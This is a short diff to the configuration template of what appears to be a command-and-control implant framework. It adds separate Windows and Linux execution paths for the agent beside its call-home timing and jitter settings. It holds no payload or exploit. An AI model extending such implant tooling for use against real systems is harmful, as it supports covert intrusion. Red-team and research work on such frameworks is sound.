@@ -17,7 +17,8 @@ let c2_port = {config["listener"]["port"]}
 # Agent
 let is_exe = IS_EXE
 let sleep_on_execution = {config["agent"]["sleep_on_execution"]}
-let agent_execution_path = protectString("{config["agent"]["exe"]["execution_path"]}")
+let agent_execution_path_windows = protectString("{config["agent"]["exe"]["execution_path"]}")
+let agent_execution_path_linux = protectString("{config["agent"]["elf"]["execution_path"]}")
 var call_home_timeframe = {config["agent"]["call_home_timeframe"]}
 var call_home_jitter_percent = {config["agent"]["call_home_jitter_percent"]}
 # Communication
